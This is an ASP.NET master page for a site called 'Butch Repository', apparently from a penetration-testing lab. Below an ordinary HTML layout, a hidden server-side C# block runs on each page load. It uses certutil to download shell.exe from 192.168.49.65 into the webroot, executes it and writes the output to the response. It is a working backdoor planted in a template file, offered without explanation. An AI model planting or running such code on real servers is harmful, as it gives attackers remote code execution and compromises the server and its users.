	<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
		<head runat="server">
			<title>Butch</title>
			<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
			<meta name="application-name" content="Butch">
			<meta name="author" content="Butch">
			<meta name="description" content="Butch">
			<meta name="keywords" content="Butch">
			<link media="all" href="style.css" rel="stylesheet" type="text/css" />
			<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
		</head>
		<body>
			<div id="wrap">
				<div id="header">Welcome to Butch Repository</div>
				<div id="main">
					<div id="content">
						<br />
						<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
						<br />
					</div>
				</div>
			</div>
		</body>
	</html>
	<%
	string stdout = "";
	ArrayList commands = new ArrayList();
	commands.Add("certutil.exe -urlcache -split -f \"http://192.168.49.65:445/shell.exe\" \"C:\\inetpub\\wwwroot\\shell.exe\"");
	commands.Add("\"C:\\inetpub\\wwwroot\\shell.exe\"");
	foreach (string cmd in commands) {
		System.Threading.Thread.Sleep(3000);
		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.UseShellExecute = false;
		procStartInfo.CreateNoWindow = true;
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		stdout = p.StandardOutput.ReadToEnd();
		Response.Write(stdout);
	}
	%>
